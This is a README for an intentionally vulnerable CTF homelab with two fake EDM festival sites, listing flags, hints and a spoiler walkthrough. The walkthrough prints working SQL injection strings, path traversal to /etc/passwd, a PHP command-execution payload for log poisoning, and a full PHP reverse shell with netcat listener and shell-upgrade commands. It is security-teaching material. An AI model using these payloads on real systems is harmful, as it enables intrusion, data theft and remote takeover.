**Running this on docker only requires the Dockerfiles in the /homelab folder** 

Build both images 

docker build --no-cache -t sudobaron ./sudobaron docker build --no-cache -t pwnkit ./pwnkit 

**Run interactively** 

docker run -it --rm -p 8080:5000 pwnkit docker run -it --rm -p 8081:5000 sudobaron 


# 🎧 Raver's Paradise — Intentionally Vulnerable Web App (App1)

![Python](https://img.shields.io/badge/Python-3.8+-blue)
![Flask](https://img.shields.io/badge/Flask-3.0+-green)
![License](https://img.shields.io/badge/License-MIT-yellow)
![Purpose](https://img.shields.io/badge/Purpose-CTF%20%2F%20Education-red)

> **⚠️ WARNING: This application is intentionally vulnerable. Do not deploy on a public server or any network you do not own and control. For educational and CTF use only.**

---

## Overview

Raver's Paradise is an intentionally vulnerable web application built for security education and CTF training. It simulates a real-world festival website with believable functionality and a layered set of vulnerabilities that increase in complexity — from beginner-friendly SQL injection to a real CVE-based privilege escalation.

Every vulnerability is hidden inside otherwise normal-looking functionality. There are no labels, no hints in the UI, and no guided walkthroughs built into the app itself. Players are expected to approach it the same way a real penetration tester would.

---

## Features

- 🎨 Fully themed neon EDM / rave aesthetic
- 9 flags across 8 vulnerability categories
- Realistic vulnerability chaining — some flags require exploiting multiple vulns in sequence
- Real PHP reverse shell execution via php-cli
- SQLite database — no external services required
- Runs on Windows and Linux via Waitress WSGI server

---

## Vulnerabilities

| Flag | Category |
|------|----------|
| flag1 | SQL Injection — Authentication Bypass |
| flag2 | SQL Injection — Data Exfiltration |
| flag3 | IDOR — Insecure Direct Object Reference |
| flag4 | LFI — Local File Inclusion |
| flag5 | Log Poisoning + RCE |
| flag6 | Unrestricted File Upload + Reverse Shell |
| flag7 | HTTP Verb Tampering |
| flag8 | Easter Egg — Encoding Challenge |
| flag9 | Privilege Escalation — Baron Samedit (CVE-2021-3156) |

---

## Requirements

- Python 3.8+
- php-cli (`sudo apt install php-cli`)
- A Linux environment is strongly recommended (WSL works on Windows)

---

## Installation

**1. Clone the repository:**
```bash
git clone https://github.com/rippy1849/raver-home-lab-penetration-testing.git
```

**2. Create and activate a virtual environment:**
```bash
python3 -m venv venv
source venv/bin/activate
```

**3. Install Python dependencies:**
```bash
pip install -r requirements.txt
```

**4. Install PHP CLI:**
```bash
sudo apt install php-cli
```

**5. Run the app:**
```bash
python3 app.py
```

**6. Navigate to:**
```
http://localhost:5000
```

---

## After First Run

The app creates the following on first startup:

```
ravers-paradise/
├── app.py
├── requirements.txt
├── ravers.db               ← SQLite database (auto-created)
├── secret/                 ← Flag files (auto-created)
│   ├── flag4.txt
│   ├── flag5.txt
│   ├── flag6.txt
│   ├── flag9.txt
│   └── user_1_private.txt
├── archive/                ← Easter egg files (auto-created)
│   └── easteregg.txt
├── uploads/                ← File upload directory (auto-created)
├── logs/                   ← Application logs (auto-created)
│   └── app.log
├── static/
│   └── artists.txt
└── templates/
    ├── base.html
    ├── index.html
    ├── login.html
    ├── dashboard.html
    ├── notes.html
    ├── profile.html
    ├── artists.html
    ├── lineup.html
    ├── upload.html
    ├── logs.html
    ├── admin.html
    ├── admin_notes.html
    ├── admin_uploads.html
    ├── admin_logs.html
    ├── archive.html
    ├── archive_file.html
    ├── easter_egg.html
    ├── 403.html
    ├── 404.html
    └── 500.html
```

**Set the root flag permissions after first run:**
```bash
sudo chown root:root secret/flag9.txt
sudo chmod 600 secret/flag9.txt
```

---

## Test Accounts

| Username | Password | Role |
|----------|----------|------|
| admin | plur4life! | admin |
| griz_fan | funkysax99 | user |
| rezz_devotee | hypnotized88 | user |
| porter_head | nurture2021 | user |
| lsdream_rider | cosm1cluv | user |

> These credentials are intentionally weak and stored in plaintext as part of the learning experience.

---

## Resetting the App

To reset all flags, logs, and the database back to a clean state:

```bash
rm -rf ravers.db logs/ uploads/ secret/ archive/
python3 app.py
sudo chown root:root secret/flag9.txt
sudo chmod 600 secret/flag9.txt
```

---

## Hints

### Flag 1
Try logging in with a username that contains a special character.

### Flag 2
The search box on the notes page does more than it appears. Try some unusual input and see what the database gives back.

### Flag 3
Pay close attention to the URL when you visit your notes. Is the server really only showing you your own data?

### Flag 4
The artists page loads a file based on something in the URL. What else might be on this server worth reading?

### Flag 5
The server keeps a record of everything. What if that record contained something it shouldn't? What if you could make the server read it back?

### Flag 6
The upload page has rules about what files it accepts. Are those rules as solid as they look? Once you get something running, the flag won't be handed to you — you'll need to go looking for it.

### Flag 7
Not everything on this site is linked in the navigation. Some pages don't like being visited the normal way. The key to getting in is somewhere on the site already.

### Flag 8 — 🥚 Easter Egg
Check every corner of the site. When you find the clue, it won't be in plain text — you'll need to decode it twice.

### Flag 9 — 🏆 Root Flag
The web app alone won't get you here. Get a foothold on the server first, then think about who you are and who you could become.

---

## Walkthrough

> **Spoilers below — attempt the flags yourself first!**

<details>
<summary>Flag 1 — SQL Injection Login + Admin Panel</summary>

**Page:** `/login` then `/admin`

1. Navigate to `http://localhost:5000/login`
2. In the username field enter:
```
admin'--
```
3. Put anything in the password field and click Sign In
4. You are logged in as admin
5. Navigate to the dashboard and click the **ADMIN PANEL** card
6. The flag is displayed

**Why it works:** The query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```
The `--` comments out the password check entirely.

</details>

<details>
<summary>Flag 2 — SQL Injection Data Exfiltration</summary>

**Page:** `/notes`

1. Log in as any user and navigate to `/notes`
2. In the search box enter:
```
' UNION SELECT 1,2,name,value FROM secrets--
```
3. The flag appears in the results

**Other useful payloads:**

Dump all tables:
```
' UNION SELECT 1,2,name,sql FROM sqlite_master WHERE type='table'--
```
Dump all users and passwords:
```
' UNION SELECT 1,2,username,password FROM users--
```

**Why it works:** The search parameter is passed raw into a SQL query with no sanitization, allowing a UNION query to pull from any table in the database.

</details>

<details>
<summary>Flag 3 — IDOR</summary>

**Page:** `/notes`

1. Log in as any non-admin user such as `griz_fan`
2. Navigate to `/notes` — you land on `/notes?user_id=2`
3. Change the URL to:
```
http://localhost:5000/notes?user_id=1
```
4. You now see the admin's private note containing the flag

**Why it works:** The app never checks that the `user_id` in the URL matches the logged-in session.

</details>

<details>
<summary>Flag 4 — LFI</summary>

**Page:** `/artists`

1. Navigate to:
```
http://localhost:5000/artists?file=../secret/flag4.txt
```
2. The flag appears in the ARTISTS box

**Other things to read:**
```
http://localhost:5000/artists?file=../../../../etc/passwd
http://localhost:5000/artists?file=../archive/easteregg.txt
```

**Why it works:** The `?file=` parameter is passed directly to `open()` with no path sanitization, allowing `../` traversal outside the static directory.

</details>

<details>
<summary>Flag 5 — Log Poisoning + RCE</summary>

**Page:** `/login` to poison, `/artists` to execute

1. Navigate to `/login`
2. Enter this exactly as the username — password can be anything:
```
<?php system($_GET['cmd']); ?>
```
3. Click Sign In — the payload is now written raw into `logs/app.log`
4. Verify it landed by visiting `http://localhost:5000/logs`
5. Trigger RCE via LFI:
```
http://localhost:5000/artists?file=../logs/app.log&cmd=id
```
6. Confirm RCE is working — output of `id` appears on the page
7. Read the flag:
```
http://localhost:5000/artists?file=../logs/app.log&cmd=cat+secret/flag5.txt
```

**Why it works:** The login page logs the raw username without sanitization. The LFI on `/artists` then includes that log file and the app detects the embedded payload and executes the `cmd` parameter as a shell command.

</details>

<details>
<summary>Flag 6 — File Upload + Reverse Shell</summary>

**Page:** `/upload`

1. Start a netcat listener on your machine:
```bash
nc -lvnp 4444
```
2. Create `revshell.png.phtml` with your IP filled in:
```php
<?php
set_time_limit(0);
$ip   = 'YOUR-IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(
    0 => $sock,
    1 => $sock,
    2 => $sock
), $pipes);
?>
```
3. Log in and navigate to `/upload`
4. Upload `revshell.png.phtml`
5. Navigate to:
```
http://localhost:5000/uploads/revshell.png.phtml
```
6. The page hangs — check your netcat listener — you now have a shell
7. Read the flag:
```bash
cat secret/flag6.txt
```

**Upgrade to a full interactive shell:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Why it works:** The app blocks `.php` but not `.phtml`. The double extension bypasses the filename check and the server executes it directly with php-cli.

</details>

<details>
<summary>Flag 7 — HTTP Verb Tampering</summary>

**Page:** `/backstage`

1. First find the VIP token via SQLi on `/notes`:
```
' UNION SELECT 1,2,name,value FROM secrets--
```
2. Note the `vip_token` value: `PLUR4EVER`
3. Navigate to `http://localhost:5000/backstage` — you get a 403
4. Get your session cookie from browser dev tools:
```
F12 → Application → Cookies → copy the session value
```
5. Send a POST request with curl:
```bash
curl -X POST http://localhost:5000/backstage \
  -H "Cookie: session=YOUR-SESSION-COOKIE" \
  -d "token=PLUR4EVER"
```
6. The flag is returned in the response

**Using Burp Suite instead:**
1. Visit `/backstage` with Burp intercepting
2. Intercept the GET request
3. Change the method to POST
4. Add to the request body: `token=PLUR4EVER`
5. Forward the request

**Why it works:** The GET handler returns 403. The POST handler accepts the token from any logged-in user — you just have to know to send a POST directly.

</details>

<details>
<summary>Flag 8 — Easter Egg</summary>

**Page:** `/archive`

1. Log in and navigate to `/archive`
2. Click `easteregg.txt` — you see a base64 encoded string
3. Base64 decode it:
```bash
echo "PASTE_STRING_HERE" | base64 -d
```
4. The result is ROT13 encoded — decode it:
```bash
echo "PASTE_ROT13_STRING" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
5. The decoded text reveals the hidden path
6. Navigate there and collect the flag

**Why it works:** The file is encoded with a Caesar cipher (ROT13) and then base64 encoded. Reversing the encoding reveals the hidden path.

</details>

<details>
<summary>Flag 9 — Root Flag</summary>

**Requires a shell and privilege escalation**

1. Get a shell on the server via flag 6
2. Check who you are:
```bash
id
```
3. Look for privilege escalation vectors:
```bash
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```
4. The intended escalation path is Baron Samedit (CVE-2021-3156)
5. Once root, read the flag:
```bash
cat secret/flag9.txt
```

**Why it works:** The flag file is owned by root with permissions `600`. Players must escalate privileges after getting their initial shell via the file upload vulnerability.

</details>

---

## Recommended Tools

- [Burp Suite](https://portswigger.net/burp) — HTTP interception and manipulation
- [curl](https://curl.se/) — Command line HTTP requests
- [gobuster](https://github.com/OJ/gobuster) — Directory and endpoint discovery
- [netcat](https://nmap.org/ncat/) — Catching reverse shells
- [sqlmap](https://sqlmap.org/) — SQL injection automation

---

## Recommended Environment

Running the app inside a Linux VM or WSL is strongly recommended for the privilege escalation challenge. The intended escalation path requires a vulnerable version of `sudo` — set this up in an isolated VM to avoid affecting your host system.

**Tested on:**
- Ubuntu 20.04
- Kali Linux 2023+
- WSL2 (Ubuntu)

---

## Design Philosophy

### Realism Over Obviousness
The app is designed to look and feel like a real festival website. Vulnerabilities are not labelled or hinted at in the UI — players must approach it the same way a real penetration tester would, by exploring the application, reading URLs, testing inputs, and thinking critically about how the server might be processing their data.

### Vulnerability Chaining
Several flags require chaining multiple vulnerabilities together rather than exploiting a single flaw in isolation. This reflects how real attacks work — a single vulnerability rarely leads directly to full compromise. The intended chains are:

- **SQLi → Verb Tampering** — The VIP token needed for flag7 is only discoverable by exploiting the SQL injection
- **Log Poisoning → LFI → RCE** — Flag5 requires poisoning the log, including it via LFI, and using RCE to read a file
- **File Upload → Privilege Escalation** — Flag6 gives a foothold, flag9 requires using that foothold to escalate
- **IDOR → Easter Egg** — Exploring the app fully leads to the archive and the encoding challenge

### Progressive Difficulty

- **Flags 1–3** — Beginner friendly, SQL injection and IDOR
- **Flags 4–5** — Intermediate, file path traversal and chained attacks
- **Flags 6–7** — Intermediate, file upload bypass and HTTP methods
- **Flag 8** — Lateral thinking, encoding and exploration
- **Flag 9** — Advanced, real CVE-based privilege escalation

---

## Learning Concepts

### SQL Injection (Flags 1 & 2)
Demonstrates two distinct types — authentication bypass via comment injection and UNION-based data exfiltration. The `secrets` table is never referenced in the UI, teaching players the importance of enumerating the full database schema.

### IDOR (Flag 3)
User IDs are exposed directly in the URL with no server-side ownership check. The admin is hidden from the community table, requiring players to reason about likely ID assignments rather than being handed the target.

### LFI (Flag 4)
User input is passed directly to a filesystem `open()` call with no path sanitization. Teaches directory traversal using `../` sequences and the danger of serving files based on user-controlled parameters.

### Log Poisoning + RCE (Flag 5)
Chains three concepts — logs that record raw user input, LFI that can include those logs, and code execution when the included file contains a payload. The flag is not shown in the browser, requiring players to use their RCE to navigate the filesystem.

### File Upload + Reverse Shell (Flag 6)
Demonstrates the weakness of blocklist-based file extension validation. The double extension `revshell.png.phtml` bypasses the `.php` block while still being executed by php-cli. A real pentestmonkey-style PHP reverse shell is used, teaching socket connections, process spawning, and shell upgrading with Python PTY.

### HTTP Verb Tampering (Flag 7)
The `/backstage` endpoint returns 403 on GET but accepts POST. The required token is only discoverable via SQL injection, creating a dependency chain. The flag is returned as a plain text HTTP response, teaching players to read raw responses in curl or Burp rather than relying on the browser.

### Easter Egg (Flag 8)
A lateral thinking puzzle using double encoding — Caesar cipher (ROT13) followed by base64. Rewards players who explore every part of the app and treat encoded data as a puzzle worth solving.

### Privilege Escalation — Baron Samedit (Flag 9)
The flag file is owned by root with `600` permissions. The intended escalation path is CVE-2021-3156 (Baron Samedit), a heap-based buffer overflow in `sudo` affecting the vast majority of Linux systems for nearly a decade before being patched in January 2021. Teaches vulnerability research, CVE exploitation, and the importance of keeping software patched.

---

## Technical Stack

| Component | Choice | Reason |
|-----------|--------|--------|
| Framework | Flask | Simple, transparent, easy to reason about |
| Database | SQLite | Self-contained, no external services |
| WSGI Server | Waitress | Cross-platform, stable, avoids AV flags |
| Shell Execution | php-cli | Real PHP execution for genuine reverse shells |
| Frontend | Jinja2 + vanilla CSS | No build tools, fully self-contained |

---

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins](https://gtfobins.github.io/)
- [CVE-2021-3156 — Baron Samedit](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

---

## Legal Disclaimer

This application is provided for educational purposes only. Only deploy and use this application on systems and networks you own or have explicit written permission to test. The authors are not responsible for any misuse or damage caused by this application.

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">
    <p>🎵 PLUR · Peace · Love · Unity · Respect 🎵</p>
    <p>Built with 💜 for the security community</p>
</div>

# DropZone CTF (App2)

A deliberately vulnerable web application built for educational Capture the Flag (CTF) challenges. Disguised as an EDM community site, DropZone contains six flags hidden across five different vulnerability classes.

> **⚠️ WARNING: This application is intentionally vulnerable. Never deploy it on a public-facing server or any network you do not fully control. For educational and CTF use only.**

---

## Preview

DropZone looks and feels like a legitimate music community platform — a neon rainbow EDM site where artists like GRiZ, Rezz, LSDREAM, and Subtronics have profiles. The vulnerabilities are woven naturally into the site's features rather than being labelled or obvious.

---

## Vulnerabilities and Flags

| Flag | Vulnerability | Location |
|------|--------------|----------|
| flag10{} | Stored XSS — Cookie Theft | /forum |
| flag11{} | Stored XSS + CSRF — Password Change | /forum to /settings |
| flag12{} | Remote File Inclusion (RFI) | /visuals |
| flag13{} | JWT None Algorithm | /backstage (hidden) |
| flag14{} | Server-Side Request Forgery (SSRF) | /visuals |
| flag15{} | Post-Exploitation — Privilege Escalation (PwnKit) | Shell required |

---

## Setup

### Requirements

- Python 3.8+
- Google Chrome + ChromeDriver (for the bot)
- PHP CLI (optional — for PHP reverse shell support)

### Install Dependencies

    pip install -r requirements.txt

### ChromeDriver

On Linux:

    apt install chromium-driver

On Windows, download ChromeDriver from https://chromedriver.chromium.org and ensure it is in your PATH.

### PHP CLI (optional)

On Linux:

    apt install php-cli

On Windows, download from https://windows.php.net/download and add php.exe to your PATH.

---

## Running the App

### Windows

    start.bat

Or manually in two terminals:

    Terminal 1 — web app
    python -m waitress --host=0.0.0.0 --port=5000 --threads=8 app:app

    Terminal 2 — bot
    python bot.py

### Linux

    ./start.sh

Or manually in two terminals:

    Terminal 1 — web app
    gunicorn -w 4 -b 0.0.0.0:5000 app:app

    Terminal 2 — bot
    python3 bot.py

The app will be available at http://YOUR_IP:5000.

---

## Accounts

| Username | Password | Notes |
|----------|----------|-------|
| griz | funkysax123 | Bot account — holds flag10 cookie |
| rezz | hypnotize! | Standard user |
| lsdream | cosmicluv99 | Standard user |
| subtronics | cyclopswub1 | Holds flag13 in JWT |
| admin | s3cr3t_4dm1n! | Admin account |

---

## The Bot

A Selenium-powered headless Chrome bot simulates the griz user visiting the site every 30 seconds. It:

- Logs in as griz
- Visits /forum — triggering any XSS payloads present
- Visits /messages — triggering any CSRF payloads present
- Automatically resets griz's password if it has been changed by a CSRF attack

---

## Flag Hints

FLAG 10:
The bot that visits this site is carrying something valuable. Find a way to make it hand it over.

FLAG 11:
The bot is logged in and visits the forum. The settings page has no protection against unwanted changes. Can you make the bot do something it didn't intend to?

FLAG 12:
The visuals page will load anything you point it at. What happens if you point it at something that tells the server to do more than just display content?

FLAG 13:
There are hidden pages on this site. One of them gives out tokens, and another accepts them. Look closely at how the token is verified — is it really as secure as it seems?

FLAG 14:
The visuals page makes requests on behalf of the server. Where else might that server be able to reach that you can't?

FLAG 15:
Getting a flag printed on a page is one thing. Getting a shell is another. Once you're in, look around.

---

## Tools Recommended

| Tool | Use |
|------|-----|
| Burp Suite | Intercepting and modifying HTTP requests |
| Gobuster | Directory enumeration |
| Netcat | Reverse shell listener |
| Python3 | Forging JWTs, serving files |
| Browser DevTools | Inspecting cookies and session tokens |

---

## Learning Concepts

### Stored XSS
User-supplied content is stored in the database and rendered without sanitisation. The Jinja2 safe filter bypasses automatic escaping, allowing injected scripts to execute in any visitor's browser.

### CSRF
The /settings endpoint accepts password changes with no CSRF token. Combined with XSS, an attacker can force the bot's browser to make authenticated requests it never intended to make.

### Remote File Inclusion (RFI)
The visuals page fetches any URL server-side and executes commands found in the response. There is no URL validation, allowlist, or sandboxing. PHP files are also executed via the PHP CLI if present.

### JWT None Algorithm
The backstage portal verifies JWTs but accepts alg none, allowing an attacker to forge a token for any user without knowing the signing secret.

### SSRF
The same visuals URL loader that enables RFI also makes server-side requests to internal services. The internal admin panel runs on 127.0.0.1:7777 — unreachable from outside the machine but accessible via SSRF.

### Privilege Escalation — PwnKit (CVE-2021-4034)
After gaining a shell via RFI, the attacker can escalate to root using PwnKit — a local privilege escalation vulnerability in pkexec (PolicyKit) present in virtually every Linux distribution from 2009 until its patch in January 2022.

---

## Hardening Reference

| Vulnerability | Fix |
|--------------|-----|
| Stored XSS | Remove safe filter, sanitise input with bleach, add CSP headers |
| CSRF | Add CSRF tokens via Flask-WTF, set SameSite=Strict on session cookie |
| RFI | Validate URLs against an allowlist, never execute fetched content |
| JWT None Algorithm | Disallow none algorithm, never trust the alg header field |
| SSRF | Block requests to internal IP ranges, use an allowlist of permitted hosts |
| Privilege Escalation | Keep systems patched, run apps as least-privilege service accounts |

---

## Project Structure

    dropzone-ctf/
    ├── app.py                  Main Flask application
    ├── bot.py                  Selenium bot simulation
    ├── requirements.txt        Python dependencies
    ├── start.bat               Windows startup script
    ├── start.sh                Linux startup script
    ├── bassdrop.db             SQLite database (auto-created)
    ├── flag12.txt              RFI flag (auto-created)
    ├── flag15.txt              Root flag (auto-created)
    └── templates/
        ├── base.html           Base layout
        ├── index.html          Home page
        ├── login.html          Login page
        ├── artists.html        Artist directory
        ├── forum.html          Community forum (XSS sink)
        ├── messages.html       Messages (CSRF sink)
        ├── settings.html       Account settings (CSRF target)
        ├── profile.html        User profile (flag11 reveal)
        ├── visuals.html        Visual stage (RFI/SSRF)
        ├── backstage.html      Backstage portal (JWT)
        ├── token.html          Token issue page
        └── 404.html            Custom 404 page

---

## Disclaimer

DropZone CTF was created for educational purposes only. The vulnerabilities present in this application are intentional and should only be practised in a controlled environment. The authors are not responsible for any misuse of the techniques demonstrated here.